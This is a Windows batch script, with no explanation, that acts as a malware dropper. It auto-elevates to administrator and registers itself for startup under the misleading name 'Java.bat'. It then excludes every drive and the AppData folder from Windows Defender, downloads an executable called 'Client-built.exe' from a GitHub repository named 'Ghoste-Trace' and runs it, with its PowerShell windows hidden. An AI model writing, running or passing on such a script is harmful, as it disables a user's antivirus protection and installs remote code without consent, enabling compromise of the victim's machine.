@echo off
:: Auto-elevate to admin if needed
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: === Variables ===
set "APPDATA_PATH=%USERPROFILE%\AppData"
set "TARGET_FILE=%APPDATA_PATH%\Client-built.exe"
set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
set "REG_NAME=Java.bat"
set "REG_PATH=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "SELF_PATH=%~f0"

:: === Clean up old startup entry or folder version ===
reg delete "%REG_PATH%" /v "%REG_NAME%" /f >nul 2>&1
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Java.bat" >nul 2>&1

:: âœ… Add to Registry with the name Java.bat
reg add "%REG_PATH%" /v "%REG_NAME%" /d "\"%SELF_PATH%\"" /f

:: === Exclude drives from Defender ===
for %%L in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%L:\ (
        powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%%L:\'"
    )
)

:: Exclude AppData
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"

:: Download and run main EXE
powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
start "" "%TARGET_FILE%"

exit
